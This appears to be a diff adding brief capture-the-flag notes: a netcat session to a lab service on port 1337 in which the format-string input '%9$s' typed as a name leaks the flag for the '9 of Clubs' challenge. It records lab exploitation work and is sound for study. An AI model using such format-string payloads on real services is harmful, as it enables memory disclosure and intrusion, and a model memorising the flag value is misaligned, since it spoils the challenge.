@@ -1,0 +1,16 @@
+# Target
+1337/tcp open  waste?
+
+nc 172.15.27.21 1337
+	Welcome to the '9 of Clubs' service.
+	-------------------------------
+	Please choose an option:
+	1. Send contact info
+	2. Greetings
+	3. Send feedback
+	0. Exit
+
+2
+Please, enter your name...
+%9$s
+Hello Flag_9_of_Clubs{b17ef17454081e89c084d5182d76c527}!!!
